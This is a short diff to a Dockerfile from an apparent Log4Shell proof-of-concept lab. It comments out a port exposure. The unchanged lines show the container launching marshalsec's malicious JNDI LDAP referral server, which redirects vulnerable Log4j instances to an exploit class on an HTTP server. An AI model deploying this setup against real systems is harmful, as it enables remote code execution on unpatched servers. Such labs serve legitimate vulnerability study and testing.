@@ -13,6 +13,6 @@ RUN cd /opt/Log4Shell_PoC/ldap_server &&\
 
 WORKDIR /opt/Log4Shell_PoC/ldap_server/target
 
-EXPOSE 1389
+#EXPOSE 1389
 
 CMD ["java", "-cp", "ldap_server-1.0-all.jar", "marshalsec.jndi.LDAPRefServer", "http://http_server:8889/#Exploit"]
